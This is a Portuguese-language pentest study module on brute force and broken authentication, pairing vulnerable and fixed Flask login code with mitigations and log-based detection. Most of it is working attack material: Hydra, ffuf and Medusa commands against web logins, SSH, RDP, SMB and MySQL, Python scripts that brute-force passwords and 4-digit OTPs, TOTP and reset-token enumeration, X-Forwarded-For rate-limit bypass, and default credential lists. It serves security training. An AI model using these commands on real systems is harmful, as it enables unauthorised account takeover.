---
title: "Brute Force & Broken Auth"
---

# Brute Force e Broken Authentication

## A Falha: Ausência de Controles Contra Tentativas Automatizadas de Autenticação

Broken Authentication vai além de "senhas fracas". A vulnerabilidade existe quando o **endpoint de autenticação não distingue um usuário humano de um script automatizado**. O desenvolvedor tipicamente implementa a lógica de verificar credenciais, mas não implementa a lógica de limitar quem pode tentar e quantas vezes.

A suposição incorreta de design é: "se o usuário não sabe a senha, ele não passa". A realidade é que o atacante pode tentar milhares de senhas por segundo, enumerando usuários válidos por diferença de resposta, atacando fluxos auxiliares (reset de senha, OTP) com a mesma falta de controle.

**Perspectiva do desenvolvedor**: o código que verifica credenciais é escrito para o caso de uso legítimo — um usuário entra com email e senha, o sistema compara com o banco, retorna sucesso ou falha. Não há nada no código que impeça que essa rotina seja chamada 10.000 vezes. Rate limiting, CAPTCHA e lockout são **controles adicionais** que precisam ser conscientemente implementados; não emergem naturalmente da lógica de autenticação.

O mesmo problema afeta fluxos de reset de senha: o endpoint `POST /identity/api/v3/otp` pode não limitar tentativas — um script consegue iterar pelas 10.000 combinações de OTP de 4 dígitos. Só após 9 tentativas a aplicação retorna "você excedeu o máximo de tentativas", e mesmo assim existem versões anteriores da API (`v1`, `v2`) sem esse controle.

**Impacto real**: account takeover completo, acesso a dados de outros usuários, escalada para contas administrativas, violação de LGPD/GDPR em caso de exposição de dados.

---

## Causa Raiz

### Padrão Vulnerável: Endpoint Sem Rate Limiting

```python
# Flask — endpoint de login vulnerável
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    if user and check_password(password, user.password_hash):
        session['user_id'] = user.id
        return redirect('/dashboard')
    
    # PROBLEMA 1: mensagem diferente para usuario invalido vs senha incorreta
    if not user:
        return "Unknown username. Check again or try your email address.", 401
    return "The password you entered is incorrect.", 401
    # PROBLEMA 2: nenhum controle de tentativas — pode ser chamado infinitamente
    # PROBLEMA 3: resposta revela se usuario existe (enumeração)
```

**O que está faltando**:
- Contador de tentativas por IP e por conta
- Bloqueio temporário após N falhas
- Resposta genérica que não diferencie usuario inválido de senha incorreta
- CAPTCHA após comportamento suspeito

```python
# Endpoint seguro
from flask_limiter import Limiter

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")   # rate limit por IP
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    # SEGURO: mesma mensagem independente do motivo da falha
    if not user or not check_password(password, user.password_hash):
        increment_failed_attempts(username)
        return "Credenciais inválidas.", 401
    
    # Resetar contador após login bem-sucedido
    reset_failed_attempts(username)
    session['user_id'] = user.id
    return redirect('/dashboard')
```

### Broken Auth Vai Além do Brute Force

Existem sub-falhas com causas raiz distintas:

| Sub-falha | Causa raiz | Mecanismo |
|-----------|------------|-----------|
| Brute force de senha | Sem rate limit | Iterar wordlist |
| Enumeração de usuário | Resposta diferencial | Comparar mensagens de erro |
| Token OTP fraco | OTP de 4 dígitos + sem rate limit | Iterar 0000-9999 |
| Reset previsível | Token sem entropia | Adivinhar ou bruteforçar token |
| Bypass de 2FA | TOTP sem rate limit | Iterar 000000-999999 |
| Credenciais padrão | Nunca alteradas | Testar admin:admin etc. |

---

## Como o Ataque Funciona

### Tipos de Brute Force

| Tipo | Descrição | Quando Usar |
|------|-----------|-------------|
| Simple | Todas combinações possíveis (a-z, 0-9) | Senha muito curta, sem wordlist |
| Dictionary | Wordlist de senhas comuns | Caso geral |
| Hybrid | Wordlist + regras (append números, leet) | Quando política de senha é conhecida |
| Credential Stuffing | Pares user:senha de vazamentos | Quando lista de leak está disponível |
| Password Spraying | Uma senha para muitos usuários | Anti-lockout, ambientes corporativos |
| Rainbow Table | Hashes pré-computados | Quando hash é obtido e não tem salt |
| Reverse | Senha fixa, variar usuários | Senhas padrão como "admin123" |

### Tipos de Autenticação

Os fatores de autenticação são classificados em três categorias: **Knowledge** (algo que você sabe — senha, PIN, pergunta secreta), **Ownership** (algo que você tem — TOTP, SMS, hardware token) e **Inherence** (algo que você é — biometria).

**SFA** (Single Factor) usa apenas um fator — mais vulnerável a brute force. **MFA** (Multi Factor) combina dois ou mais fatores — ainda pode ser bypassado se cada fator individualmente não tiver rate limiting.

---

## Discovery / Identificação

### Enumeração de Usuários

**Por que importa**: sem saber usuários válidos, o brute force é cego. Aplicações que retornam mensagens diferentes para "usuário inválido" vs "senha incorreta" facilitam enumerar.

#### Enumeração via Mensagem de Erro

```
# Mensagem para usuario invalido:
"Unknown username. Check again or try your email address."

# Mensagem para senha incorreta:
"The password you entered for the username admin is incorrect."
```

```bash
# ffuf para enumerar usuarios — filtrar resposta especifica
ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt:FUZZ \
     -u http://alvo.com/login \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=FUZZ&password=x" \
     -fr "Unknown username"

# -fr filtra respostas que CONTEM o padrao (usuarios invalidos)
# O que sobrar sao usuarios validos
```

#### Enumeração via Timing

Aplicações que verificam a senha apenas após confirmar o usuário podem ter diferença de tempo:

```bash
# Medir tempo de resposta para usuario invalido vs valido
time curl -s -X POST "http://alvo.com/login" \
     -d "username=admin&password=x"

time curl -s -X POST "http://alvo.com/login" \
     -d "username=usuario_inexistente_xyz&password=x"
```

#### Enumeração via WordPress

```bash
# WordPress expoe usuarios via API
curl -s "http://alvo.com/wp-json/wp/v2/users" | jq '.[].name'

# Ou via parametro autor
curl -s "http://alvo.com/?author=1" -L | grep -oP "(?<=author/).*?(?=/)"
```

#### Enumeração via Fluxo de Reset de Senha

Enviar um `POST /forgot-password` com um email e observar a resposta. Se a aplicação retornar "email enviado para john@example.com" confirmando o endereço, ela revela usuários válidos. Um atacante que coletou emails via outra vulnerabilidade (como exposição de dados em endpoint de posts) pode sistematicamente resetar senhas de usuários conhecidos.

```bash
# Confirmar enumeracao via reset
curl -s -X POST "http://alvo.com/api/v3/forgot-password" \
     -H "Content-Type: application/json" \
     -d '{"email": "james@example.com"}'
# Se retornar 200 confirmando envio -> usuario existe
```

### Identificar Pontos de Brute Force

```
/login
/admin/login
/wp-login.php
/user/login
/api/auth
/signin
/account/login
/members/login
/api/v1/otp/check
/api/v2/otp/check
/api/v3/otp/check
```

**Verificar versões antigas de API**: se `/api/v3/otp` tem rate limiting, versões anteriores (`v1`, `v2`) podem não ter o mesmo controle implementado.

---

## Exploitation

### Hydra — Referência Completa

```bash
# HTTP POST Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      alvo.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
      -t 30

# HTTP POST Form com cookies
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      alvo.com http-post-form \
      "/login:username=^USER^&password=^PASS^:F=Invalid:H=Cookie: session=abc123" \
      -t 30

# HTTP GET Form
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      alvo.com http-get-form \
      "/login?user=^USER^&pass=^PASS^:F=fail" \
      -t 30

# SSH
hydra -l root -P /usr/share/wordlists/rockyou.txt \
      ssh://alvo.com -t 4

# FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      ftp://alvo.com -t 10

# RDP
hydra -l Administrator -P passwords.txt \
      rdp://alvo.com -t 4 -V

# SMB
hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
      smb://alvo.com -t 1

# MySQL
hydra -l root -P passwords.txt \
      mysql://alvo.com -t 10

# Lista de usuarios
hydra -L users.txt -P passwords.txt \
      alvo.com http-post-form \
      "/login:user=^USER^&pass=^PASS^:F=fail" -t 20

# Verboso + salvar resultados
hydra -l admin -P rockyou.txt \
      alvo.com http-post-form \
      "/login:user=^USER^&pass=^PASS^:F=fail" \
      -o hydra_results.txt -V
```

### ffuf para Brute Force de Senhas

```bash
# Brute force de senha com usuario conhecido
ffuf -w /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt:FUZZ \
     -u http://alvo.com/login \
     -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=FUZZ" \
     -fr "Invalid password" \
     -t 50

# Com filtro de tamanho de resposta
ffuf -w rockyou.txt:FUZZ \
     -u http://alvo.com/login \
     -X POST \
     -d "user=admin&pass=FUZZ" \
     -fs 1234 \
     -t 50
```

### Medusa

```bash
# HTTP POST
medusa -h alvo.com -u admin -P rockyou.txt \
       -M http -m "POST /login username=^USER^&password=^PASS^:fail" -t 20

# SSH
medusa -h alvo.com -u root -P rockyou.txt -M ssh -t 4
```

### Python Script de Brute Force

```python
import requests

url = "http://alvo.com/login.php"
username = "admin"

with open("/usr/share/wordlists/rockyou.txt", "r", encoding="latin-1") as f:
    for password in f:
        password = password.strip()
        data = {"username": username, "password": password}
        r = requests.post(url, data=data)
        if "Invalid" not in r.text and r.status_code == 200:
            print(f"[+] Senha encontrada: {password}")
            break
        else:
            print(f"[-] Tentativa: {password}")
```

### Script Python para PIN de 4 Dígitos (Ataque a OTP)

O endpoint `/api/v3/otp/check` pode aceitar tentativas ilimitadas até um limite. O Burp Intruder pode ser configurado com payload numérico de 0000 a 9999 para bruteforçar o OTP enviado ao email da vítima.

```python
import requests

url = "http://alvo.com/api/v3/otp/check"
session = requests.Session()

# Primeiro fazer login
session.post("http://alvo.com/login.php", 
             data={"username": "admin", "password": "admin"})

for pin in range(0, 10000):
    pin_str = f"{pin:04d}"
    r = session.post(url, json={"otp": pin_str})
    if "invalid" not in r.text.lower() and "incorrect" not in r.text.lower():
        print(f"[+] OTP encontrado: {pin_str}")
        break
    print(f"[-] Tentando: {pin_str}", end="\r")
```

---

## Broken Authentication — Técnicas Específicas

### 1. Brute Force de Token de Reset de Senha

Tokens fracos (4 dígitos, tempo-baseados, previsíveis):

```bash
# Gerar lista de tokens de 4 digitos
seq -w 0 9999 > tokens.txt

# Brute force via ffuf
ffuf -w tokens.txt:FUZZ \
     -u "http://alvo.com/reset?token=FUZZ" \
     -fr "Invalid token" \
     -t 100

# Ou via POST
ffuf -w tokens.txt:FUZZ \
     -u "http://alvo.com/reset" \
     -X POST \
     -d "token=FUZZ&password=newpass123" \
     -fr "Invalid" \
     -t 100
```

### 2. Bypass de 2FA (TOTP)

Quando TOTP não tem rate limit ou bloqueio:

```bash
# Gerar todos os codigos TOTP de 6 digitos
seq -w 000000 999999 > totp.txt

# Brute force
ffuf -w totp.txt:FUZZ \
     -u "http://alvo.com/2fa" \
     -X POST \
     -H "Cookie: session=SESSIONID" \
     -d "code=FUZZ" \
     -fr "Invalid 2FA Code" \
     -t 100
```

### 3. Bypass de Rate Limit via X-Forwarded-For

Muitas aplicações limitam tentativas por IP. Mas aceitam o IP do header `X-Forwarded-For`:

```bash
# Brute force com IP rotativo via header
for i in $(seq 1 1000); do
    PASS=$(sed -n "${i}p" /usr/share/wordlists/rockyou.txt)
    curl -s -X POST "http://alvo.com/login" \
         -H "X-Forwarded-For: 1.2.3.$i" \
         -d "username=admin&password=$PASS" | grep -i "success\|welcome"
done
```

```python
import requests

url = "http://alvo.com/login"
passwords = open("rockyou.txt").readlines()

for i, password in enumerate(passwords):
    password = password.strip()
    headers = {"X-Forwarded-For": f"10.0.0.{i % 255}"}
    r = requests.post(url, 
                     data={"username": "admin", "password": password},
                     headers=headers)
    if "Invalid" not in r.text:
        print(f"[+] Senha: {password}")
        break
```

Headers alternativos que podem bypassar rate limit:
```
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
CF-Connecting-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### 4. Perguntas de Segurança Adivinháveis

Aplicações que usam perguntas de segurança para reset de senha:

```bash
# Wordlist de respostas comuns para "cidade natal"
ffuf -w /opt/useful/seclists/Fuzzing/cities.txt:FUZZ \
     -u "http://alvo.com/forgot" \
     -X POST \
     -d "username=admin&security_answer=FUZZ" \
     -fr "Incorrect answer"
```

### 5. Credenciais Padrão

```bash
# Recursos para credenciais padrao
# CIRT.net: https://cirt.net/passwords
# SecLists: /opt/useful/seclists/Passwords/Default-Credentials/

# Teste rapido com wordlist de credenciais padrao
hydra -C /opt/useful/seclists/Passwords/Default-Credentials/default-passwords.txt \
      http-post-form://alvo.com"/login:user=^USER^&pass=^PASS^:F=fail"

# Credenciais padrao comuns
admin:admin
admin:password
admin:123456
admin:admin123
root:root
root:toor
guest:guest
test:test
administrator:password
```

---

## Bypass

### Bypass via Versões Anteriores de API

A aplicação pode proteger `/api/v3/otp/check` com rate limiting, mas as versões anteriores do endpoint (`v1`, `v2`) frequentemente não têm essa proteção:

```bash
# v3 tem rate limit
curl -s -X POST "http://alvo.com/api/v3/otp/check" \
     -d '{"otp": "1234"}'
# Resposta apos 9 tentativas: "exceeded maximum attempts"

# v1 pode nao ter o mesmo controle
curl -s -X POST "http://alvo.com/api/v1/otp/check" \
     -d '{"otp": "1234"}'
# Pode aceitar tentativas ilimitadas
```

**Como identificar**: no Burp History, observar o padrão de URL — se a aplicação usa versioning de API (`v1`, `v2`, `v3`), testar versões anteriores para cada endpoint crítico.

---

## Automação

### Criação de Wordlist Customizada com Política de Senha

```bash
# Filtrar por politica: maiusc + minusc + digito + min 10 chars
grep '[[:upper:]]' /usr/share/wordlists/rockyou.txt \
  | grep '[[:lower:]]' \
  | grep '[[:digit:]]' \
  | grep -E '.{10,}' \
  > custom_wordlist.txt

wc -l custom_wordlist.txt  # verificar quantas senhas restaram
```

### Geração com CeWL (spider de palavras do site)

```bash
# Gerar wordlist baseada no conteudo do site alvo
cewl http://alvo.com -m 6 -d 3 -o cewl_wordlist.txt

# Combinar com regras do hashcat
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule cewl_wordlist.txt \
        > cewl_mutated.txt
```

### Password Spraying

```bash
# Um ataque de spraying — uma senha para todos os usuarios
ffuf -w users.txt:USER -w passwords.txt:PASS \
     -u "http://alvo.com/login" \
     -X POST \
     -d "username=USER&password=PASS" \
     -fr "Invalid" \
     -mode pitchfork \
     -t 10  # baixo para evitar lockout
```

---

## Detecção e Mitigação

### Do Lado do Defensor

```bash
# Detectar brute force nos logs — muitas requisicoes POST ao login
grep "POST /login" /var/log/apache2/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn | head -20

# Detectar 401/403 repetidos
grep " 401 \| 403 " /var/log/apache2/access.log \
  | awk '{print $1}' | sort | uniq -c | sort -rn

# Fail2ban status
fail2ban-client status sshd
```

### Controles que o Desenvolvedor Deve Implementar

A raiz do problema é que o código de autenticação precisa ser complementado com controles que não emergem naturalmente da lógica de negócio:

**Rate limiting**: limitar tentativas por IP **e** por conta separadamente. Limitar apenas por IP é bypassável com rotação de IP. Limitar apenas por conta é bypassável com distribuição de tentativas entre IPs.

**Account lockout temporário**: após N falhas, bloquear por X minutos. Evitar lockout permanente (risco de DoS). O número N deve ser baixo o suficiente para dificultar brute force mas alto o suficiente para não frustrar usuários legítimos (tipicamente 5-10 tentativas).

**CAPTCHA progressivo**: não implementar CAPTCHA desde o início (prejudica UX), mas introduzir após comportamento suspeito (ex: 3+ falhas consecutivas).

**Mensagens de erro genéricas**: nunca revelar se o usuário existe ou não. Usar sempre a mesma mensagem: "Credenciais inválidas. Tente novamente."

**Tokens de reset com alta entropia**: OTP de 4 dígitos tem apenas 10.000 combinações — bruteforçável em segundos. Usar tokens de pelo menos 6 caracteres alfanuméricos (36^6 = 2,1 bilhões de combinações) com expiração de 15 minutos.

**Aplicar controles em TODAS as versões da API**: quando um novo endpoint com controles melhores é lançado, as versões antigas devem ser desativadas ou receber os mesmos controles. Endpoints legados sem deprecação são vetores de ataque frequentes.

```python
# Exemplo: verificar versao da API no middleware
@app.before_request
def deprecate_old_api():
    if request.path.startswith('/api/v1/') or request.path.startswith('/api/v2/'):
        return jsonify({"error": "API version deprecated"}), 410
```

**MFA obrigatório para contas críticas**: mesmo com rate limiting, adicionar segundo fator elimina o risco de brute force de senha.

**Notificação de tentativas suspeitas**: alertar usuário sobre tentativas de login de novo dispositivo/IP/geo-localização.

---

## Cheatsheet Rápido

| Ataque | Comando |
|--------|---------|
| Hydra HTTP POST | `hydra -l admin -P rockyou.txt alvo.com http-post-form "/login:user=^USER^&pass=^PASS^:F=fail"` |
| Hydra SSH | `hydra -l root -P rockyou.txt ssh://alvo.com -t 4` |
| ffuf usuário | `ffuf -w users.txt:FUZZ -u URL -X POST -d "user=FUZZ&pass=x" -fr "Unknown"` |
| ffuf senha | `ffuf -w rockyou.txt:FUZZ -u URL -X POST -d "user=admin&pass=FUZZ" -fr "Invalid"` |
| Token reset OTP | `seq -w 0 9999 > t.txt && ffuf -w t.txt:FUZZ -u URL?token=FUZZ -fr "Invalid"` |
| Rate bypass | Header `X-Forwarded-For: IP_DIFERENTE` em cada requisição |
| Credenciais padrão | `hydra -C default-passwords.txt http-post-form://alvo.com"/login..."` |
| API versão antiga | Trocar `/api/v3/` por `/api/v1/` em endpoints com rate limit |

---

## Módulos Relacionados

Brute force e broken authentication são o ponto de entrada mais direto para comprometimento de conta. O módulo de **JWT Attacks** (`02_jwt_attacks.md`) cobre outro vetor de broken auth: tokens com assinatura bypassável substituem credenciais, então fraquezas no segredo JWT são igualmente exploráveis por brute force. **Session Security** (`04_session_security.md`) entra em cena após o comprometimento de credenciais — session fixation e sequestro de token são os próximos passos naturais. Para o passo seguinte ao account takeover, **BOLA/IDOR** (`../08_access_control/01_idor.md`) cobre como acessar dados de outros usuários usando uma conta comprometida com autorização insuficiente por objeto. As referências externas principais são OWASP OTG-AUTHN, os módulos 13 (Login Brute Forcing) e 14 (Broken Authentication) do HTB Bug Bounty Hunter Path, e as wordlists do SecLists em `/Passwords/` e `/Usernames/`.
